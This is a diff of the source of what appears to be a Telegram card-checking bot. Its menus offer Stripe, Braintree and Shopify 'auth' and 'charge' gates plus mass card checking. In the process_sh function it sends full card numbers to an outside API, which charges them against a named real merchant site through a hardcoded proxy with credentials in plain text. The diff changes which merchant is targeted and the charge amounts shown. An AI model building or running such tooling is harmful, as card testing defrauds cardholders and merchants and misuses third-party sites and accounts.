@@ -497,10 +497,10 @@ async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} <code>/vbv</code> – 3DS Lookup\n"
         f"{bullet_link} <code>/b3 cc|mm|yy|cvv</code> – Braintree Premium Auth\n"
         f"{bullet_link} <code>/chk cc|mm|yy|cvv</code> – Stripe Auth\n"
-        f"{bullet_link} <code>/st cc|mm|yy|cvv</code> – Stripe 1$ Auth\n"
+        f"{bullet_link} <code>/st cc|mm|yy|cvv</code> – Stripe 1$\n"
         f"{bullet_link} <code>/mass</code> – Mass Stripe Auth 2\n"
         f"{bullet_link} <code>/gate site url</code> – Payment Gateway Checker\n"
-        f"{bullet_link} <code>/sh</code> – Shopify 2.5$\n"
+        f"{bullet_link} <code>/sh</code> – Shopify 1.0$\n"
         f"{bullet_link} <code>/seturl &lt;site url&gt;</code> – Set a Shopify site\n"
         f"{bullet_link} <code>/mysites</code> – View your added site\n"
         f"{bullet_link} <code>/sp</code> – Auto Shopify Checker\n"
@@ -670,7 +670,7 @@ async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     await q.answer()
     text = (
         "✦━━━━━━━━━━━━━━✦\n"
-        "      💸 <b>Shopify 2.5$</b>\n"
+        "      💸 <b>Shopify 1.0$</b>\n"
         "✦━━━━━━━━━━━━━━✦\n\n"
         "• <code>/sh</code> - <i>Check a single card on Shopify $2.5</i>\n"
         "  Example:\n"
@@ -841,7 +841,7 @@ async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} <code>/vbv cc|mm|yy|cvv</code> – 3DS Lookup\n\n"
 
         "🔹 <b>𝙎𝙝𝙤𝙥𝙞𝙛𝙮</b>\n"
-        f"{bullet_link} <code>/sh</code> – Shopify Charge $2.5\n"
+        f"{bullet_link} <code>/sh</code> – Shopify Charge $1.0\n"
         f"{bullet_link} <code>/seturl &lt;site url&gt;</code> – Set your Shopify site\n"
         f"{bullet_link} <code>/sp</code> – Auto check on your saved Shopify site\n"
         f"{bullet_link} <code>/msp</code> – Mass Shopify Charged\n"
@@ -2314,7 +2314,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://craneandcanopy.com"
+            f"?site=https://mikmotoren.de"
             f"&cc={full_card}"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
@@ -2363,7 +2363,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         final_msg = (
             f"◇━━〔 <b>SHOPIFY</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟐.𝟏𝟓$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑺𝒉𝒐𝒑𝒊𝒇𝒚 𝟏.𝟎$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{escape(response)}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
